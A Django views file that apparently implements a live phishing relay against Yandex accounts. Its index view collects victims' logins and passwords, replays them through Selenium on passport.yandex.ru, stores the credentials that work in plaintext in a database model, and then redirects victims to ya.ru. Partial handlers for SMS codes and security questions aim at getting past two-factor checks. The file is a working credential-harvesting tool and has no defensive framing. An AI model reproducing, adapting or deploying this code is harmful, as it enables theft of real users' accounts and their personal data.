import asyncio
import logging
from datetime import datetime
from channels.db import database_sync_to_async
from django.shortcuts import render,redirect
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from asgiref.sync import sync_to_async
from .models import CustomUser
from selenium.common.exceptions import TimeoutException
from django.http import HttpResponse

selenium_drivers = {} #Dictionary of Web Drivers


async def check_timeout_and_close_drivers():
    while True:
        logging.warning(f'{selenium_drivers[0]["last_activity"]}')
        await asyncio.sleep(10)  # Check every 10 seconds
        for client_ip, driver_info in list(selenium_drivers.items()):
            last_activity = datetime.now().timestamp() - driver_info["last_activity"]
            if last_activity > 120:  # 2 minutes
                await close_driver(driver_info["driver"], client_ip)


async def close_driver(driver, client_ip):
    if client_ip in selenium_drivers:
        driver.quit()
        del selenium_drivers[client_ip]

def update_last_activity(request, client_ip):
    if client_ip in selenium_drivers:
        selenium_drivers[client_ip]["last_activity"] = datetime.now().timestamp()

@database_sync_to_async
def get_last_activity(request):
    return request.session.get('last_activity', None)


@database_sync_to_async
def set_last_activity(request, timestamp):
    request.session['last_activity'] = timestamp

#Main Function
async def index(request):

    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)
    await set_last_activity(request, datetime.now().timestamp())
    await sync_to_async(update_last_activity)(request, client_ip)
    if request.method == 'POST':
        if driver is not None and driver.current_window_handle:
            login = request.POST.get('login')
            password = request.POST.get('passwd')
            phone = request.POST.get('phone')

            if password:
                result = await asyncio.to_thread(sign_in, driver, login, password)
                if result == "incorrect_login":
                    return await sync_to_async(render)(request, 'index.html', {'incorrect_login': True})


                elif result == "success":
                    custom_user = CustomUser(login=login, password=password)
                    await sync_to_async(custom_user.save)()
                    driver.quit()
                    return await sync_to_async(redirect)('https://ya.ru/')

                elif result == "sms_code":
                    return HttpResponse('sms_code')
                    # phone_secure = WebDriverWait(driver, 10).until(
                    #     EC.presence_of_element_located((By.TAG_NAME, "strong"))
                    # )
                    # phone_submit = driver.find_element(By.TAG_NAME, "button")
                    # phone_submit.click()
                    # return await sync_to_async(render)(request, 'secure_login.html',
                    #                                    {'phone_number': phone_secure.text})

                elif result == "security_question":
                    # Handle security question
                    return HttpResponse('security question')

                elif result == "incorrect_password":

                    return await sync_to_async(render)(request, 'index.html', {'incorrect_password': True})
                else:
                    return await sync_to_async(render)(request, 'index.html')

            elif login:
                await asyncio.to_thread(open_yandex_passport, driver)
                username_login = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, 'login'))
                )
                login_submit = driver.find_element(By.ID, "passp:sign-in")
                username_login.send_keys(login)
                login_submit.click()

                return await sync_to_async(render)(request, 'welcome.html',
                                                   {'login_name': username_login.get_attribute('value')})
            elif phone:
                pass
            else:
                return await sync_to_async(render)(request, 'index.html', {'incorrect_data': True})

    return await sync_to_async(render)(request, 'index.html')

#Create New driver Selenium for New User
def create_selenium_driver():
    chrome_options = Options()
    chrome_options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(chrome_options=chrome_options)

    return driver

def open_yandex_passport(driver):
    driver.get("https://passport.yandex.ru")

#Actions performed for authorization
def sign_in(driver, login, password):
    open_yandex_passport(driver)
    username_login = WebDriverWait(driver, 3).until(
        EC.presence_of_element_located((By.NAME, 'login'))
    )
    login_submit = driver.find_element(By.ID, "passp:sign-in")
    username_login.send_keys(login)
    login_submit.click()

    try:
        username_password = WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.NAME, 'passwd')))
        password_submit = driver.find_element(By.ID, "passp:sign-in")
        username_password.send_keys(password)
        password_submit.click()
    except TimeoutException:
        return "incorrect_login"

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    success, sms_code, security_question, incorrect_password = loop.run_until_complete(
        asyncio.gather(
            asyncio.to_thread(check_success, driver),
            asyncio.to_thread(check_sms_code, driver),
            asyncio.to_thread(check_security_question, driver),
            asyncio.to_thread(check_incorrect_password, driver)
        )
    )
    logging.warning(f"ALL{[success, sms_code, security_question, incorrect_password]}")
    result = success or sms_code or security_question or incorrect_password or "unknown_error"
    logging.warning(f"{result}")
    return result



#Check Exceptions
async def get_driver(request, client_ip):
    if client_ip not in selenium_drivers:
        selenium_drivers[client_ip] = {
            "driver": await asyncio.to_thread(create_selenium_driver),
            "last_activity": datetime.now().timestamp()
        }
    else:
        driver_info = selenium_drivers[client_ip]
        if not driver_info["driver"].current_window_handle:
            driver_info["driver"].quit()
            driver_info["driver"] = await asyncio.to_thread(create_selenium_driver)
    return selenium_drivers[client_ip]["driver"]



async def handle_sms_verification(request):
    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)
    if request.method == 'POST':
        pass
    return await sync_to_async(render)(request, 'verification.html')

def check_success(driver):
    try:
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.CLASS_NAME, "UserID-Avatar"))
        )
        return "success"
    except TimeoutException:
        return None

def check_sms_code(driver):
    try:
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.CLASS_NAME, "passp-field-question"))
        )
        return "sms_code"
    except TimeoutException:
        return None

def check_security_question(driver):
    try:
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.CLASS_NAME, "auth-challenge__question"))
        )
        return "security_question"
    except TimeoutException:
        return None

def check_incorrect_password(driver):
    try:
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located((By.ID, "field:input-passwd:hint"))
        )
        return "incorrect_password"
    except TimeoutException:
        return None

logging.warning(f'meow')
loop = asyncio.get_event_loop()
loop.create_task(check_timeout_and_close_drivers())